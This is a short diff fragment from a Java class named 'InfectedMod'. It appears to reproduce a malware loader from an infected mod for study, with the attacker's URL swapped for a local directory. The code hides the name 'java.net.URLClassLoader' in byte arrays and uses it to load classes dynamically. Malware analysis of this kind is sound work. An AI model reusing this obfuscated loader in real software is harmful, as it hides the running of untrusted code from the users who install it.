@@ -25,6 +25,7 @@ public class InfectedMod {
                 // "java.net.URLClassLoader"
                 106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
         })).getConstructor(URL[].class).newInstance((Object) new URL[] {
+                // this path was to the attacker's URL, but I changed it to a local directory for simplicity
                 new URL(
                         "file://" + path.toString() + "/")
         })).getMethod(new String(new byte[] {
